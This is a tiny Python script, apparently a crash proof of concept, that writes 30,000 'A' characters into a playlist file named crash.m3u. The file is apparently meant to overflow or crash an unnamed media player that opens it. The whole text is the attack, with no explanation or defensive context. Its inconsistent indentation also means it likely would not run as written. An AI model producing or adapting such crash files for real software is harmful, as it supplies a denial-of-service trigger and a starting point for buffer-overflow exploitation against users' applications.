import io
     a="A"*30000
     file =open("crash.m3u","w")
     file.write(a)
     file.close()